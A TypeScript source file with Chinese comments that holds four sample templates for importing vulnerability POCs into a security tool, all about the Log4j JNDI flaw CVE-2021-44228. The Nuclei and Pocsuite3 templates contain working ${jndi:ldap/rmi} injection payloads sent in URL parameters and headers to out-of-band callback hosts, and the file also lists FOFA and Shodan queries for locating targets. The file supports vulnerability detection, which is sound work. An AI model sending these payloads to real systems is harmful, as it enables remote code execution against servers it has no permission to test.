/**
 * POC 导入模板集合。
 *
 * 各格式模板独立维护，新增格式只需追加条目并扩展 POC_TEMPLATE_LIST。
 * 模板展示：Nuclei YAML、JSON、Pocsuite3、Markdown
 */

export interface PocTemplate {
  /** 格式标识 */
  key: 'nuclei' | 'json' | 'pocsuite3' | 'markdown'
  /** 展示名称 */
  label: string
  /** 文件扩展名 */
  ext: string
  /** 模板原文 */
  content: string
}

const NUCLEI_TEMPLATE = `id: CVE-2021-44228

info:
  name: Apache Log4j2 JNDI 注入远程代码执行检测
  author: security-team
  severity: critical
  description: |
    Log4j2 <=2.14.1 JNDI 特性未限制 LDAP/RMI 查找，可触发远程代码执行。
    攻击者可利用该漏洞获取服务器控制权。
  remediation: |
    升级到 Apache Log4j 2.15.0 或更高版本。
    临时缓解措施：设置环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS=true。
  classification:
    cve-id:
      - CVE-2021-44228
    cwe-id:
      - CWE-502
      - CWE-917
    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.8
  tags: rce, log4j, oob, jndi, CVE-2021-44228, apache
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://github.com/projectdiscovery/nuclei-templates
  metadata:
    vendor: apache
    product: log4j
    fofa-query: app="Apache-Log4j"
    shodan-query: http.title:"log4j"
    publicwww-query: "log4j"
    cnvd: CNVD-2021-95993
    language: yaml
    affected_versions:
      - version_start: "2.0"
        version_start_type: ">="
        version_end: "2.14.1"
        version_end_type: "<="

http:
  - method: GET
    path:
      - "{{BaseURL}}/?payload=\${jndi:ldap://{{interactsh-url}}/test}"
      - "{{BaseURL}}/api/?input=\${jndi:rmi://{{interactsh-url}}/poc}"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
      X-Forwarded-For: "\${jndi:ldap://{{interactsh-url}}/log4j}"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "\${jndi:ldap"
          - "\${jndi:rmi"
        part: body

    extractors:
      - type: regex
        name: version
        part: body
        regex:
          - "Log4j ([0-9.]+)"
`

const JSON_TEMPLATE = `{
  "name": "log4j-rce",
  "title": "Apache Log4j2 JNDI 注入远程代码执行",
  "description": "Log4j2 <=2.14.1 JNDI 特性未限制 LDAP/RMI 查找，可触发远程代码执行。",
  "severity": "critical",
  "author": "security-team",
  "language": "yaml",
  "content": "id: log4j-rce\\n\\ninfo:\\n  name: Apache Log4j2 JNDI RCE\\n  severity: critical\\n\\nhttp:\\n  - method: GET\\n    path:\\n      - \\"{{BaseURL}}/\\"\\n    matchers:\\n      - type: word\\n        words:\\n          - \\"log4j\\"\\n",
  "cve_ids": ["CVE-2021-44228"],
  "cnvd_ids": ["CNVD-2021-95993"],
  "tags": ["rce", "log4j", "oob", "jndi"],
  "references": [
    { "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228", "label": "NVD" }
  ],
  "vendor": "apache",
  "product": [
    { "vendor": "apache", "product": "log4j", "version": "2.14.1", "version_start": "2.0", "version_start_type": ">=", "version_end": "2.14.1", "version_end_type": "<=" }
  ],
  "cvss_score": 9.8,
  "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
  "remediation": "升级到 Apache Log4j 2.15.0 或更高版本。",
  "affected_versions": [
    { "version_start": "2.0", "version_start_type": ">=", "version_end": "2.14.1", "version_end_type": "<=" }
  ],
  "metadata": {
    "fofa-query": "app=\\"Apache-Log4j\\"",
    "shodan-query": "http.title:\\"log4j\\"",
    "publicwww-query": "\\"log4j\\""
  }
}`

const POCSUITE3_TEMPLATE = `#!/usr/bin/env python3
"""
Pocsuite3 POC 模板
"""
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.lib.core.enums import VUL_TYPE


class DemoPOC(POCBase):
    """POC 名称与基本信息"""
    vulID = "CVE-2021-44228"           # 漏洞编号
    cnvdID = "CNVD-2021-95993"         # CNVD 编号
    version = "1"                       # POC 版本
    author = "security-team"            # 作者
    vulDate = "2021-12-10"              # 漏洞公开日期
    createDate = "2024-01-01"           # POC 创建日期
    updateDate = "2024-01-01"           # POC 更新日期
    references = [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ]                                   # 参考链接
    name = "Apache Log4j2 JNDI RCE"     # POC 名称
    appPowerLink = "https://logging.apache.org"  # 产品官网
    appName = "Apache Log4j2"           # 产品名称
    appVersion = "<=2.14.1"             # 影响版本
    vulType = VUL_TYPE.CODE_EXECUTION   # 漏洞类型
    category = POC_CATEGORY.EXPLOITS.REMOTE  # 漏洞分类
    desc = """Log4j2 <=2.14.1 JNDI 特性未限制 LDAP/RMI 查找，
可触发远程代码执行。"""                     # 漏洞描述
    pocDesc = "检测目标是否存在 Log4j 漏洞"   # POC 描述
    samples = []                         # 检测样本
    # 扩展字段（导入管道自动识别）
    language = "python"                  # 脚本语言
    cvss_score = 9.8                     # CVSS 评分
    cvss_metrics = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"  # CVSS 向量
    remediation = "升级到 Apache Log4j 2.15.0 或更高版本。"  # 修复建议
    fofa_syntax = 'app="Apache-Log4j"'  # FOFA 语法
    shodan_syntax = 'http.title:"log4j"'  # Shodan 语法
    publicwww_syntax = '"log4j"'         # PublicWWW 语法

    def _verify(self):
        """验证模式：检测漏洞是否存在"""
        result = {}
        target = self.get_option("target")
        payload = "\\\${jndi:ldap://test.dnslog.cn/log4j}"
        headers = {
            "User-Agent": payload,
            "X-Forwarded-For": payload,
        }
        try:
            resp = requests.get(target, headers=headers, timeout=10, verify=False)
            if resp and resp.status_code:
                result["VerifyInfo"] = {
                    "URL": target,
                    "Payload": payload,
                }
        except Exception:
            pass
        return self.parse_output(result)

    def _attack(self):
        """攻击模式：实际利用（需谨慎）"""
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("未发现漏洞")
        return output


register_poc(DemoPOC)
`

const MARKDOWN_TEMPLATE = `---
title: Apache Log4j2 JNDI 注入远程代码执行
severity: critical
author: security-team
description: |
  Log4j2 <=2.14.1 JNDI 特性未限制 LDAP/RMI 查找，
  可触发远程代码执行。攻击者可利用该漏洞获取服务器控制权。
cve:
  - CVE-2021-44228
cnvd:
  - CNVD-2021-95993
tags: [rce, log4j, oob, jndi]
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://github.com/projectdiscovery/nuclei-templates
fofa_syntax: app="Apache-Log4j"
shodan_syntax: http.title:"log4j"
publicwww_syntax: "log4j"
language: markdown
vendor: apache
product:
  - vendor: apache
    product: log4j
    version: "2.14.1"
    version_start: "2.0"
    version_start_type: ">="
    version_end: "2.14.1"
    version_end_type: "<="
cvss_metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
remediation: |
  升级到 Apache Log4j 2.15.0 或更高版本。
  临时缓解措施：设置环境变量 LOG4J_FORMAT_MSG_NO_LOOKUPS=true。
affected_versions:
  - version_start: "2.0"
    version_start_type: ">="
    version_end: "2.14.1"
    version_end_type: "<="
---

# Apache Log4j2 JNDI 注入远程代码执行

## 漏洞描述

Log4j2 <=2.14.1 JNDI 特性未限制 LDAP/RMI 查找，可触发远程代码执行。
攻击者可利用该漏洞获取服务器控制权。

## 影响范围

- Apache Log4j 2.0 ~ 2.14.1

## 修复建议

升级到 Apache Log4j 2.15.0 或更高版本。

## 参考链接

- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
`

/** 全部导入模板，按格式顺序展示。 */
export const POC_TEMPLATE_LIST: PocTemplate[] = [
  { key: 'nuclei', label: 'Nuclei', ext: '.yaml / .yml', content: NUCLEI_TEMPLATE },
  { key: 'json', label: 'JSON', ext: '.json', content: JSON_TEMPLATE },
  { key: 'pocsuite3', label: 'Pocsuite3', ext: '.py', content: POCSUITE3_TEMPLATE },
  { key: 'markdown', label: 'Markdown', ext: '.md', content: MARKDOWN_TEMPLATE },
]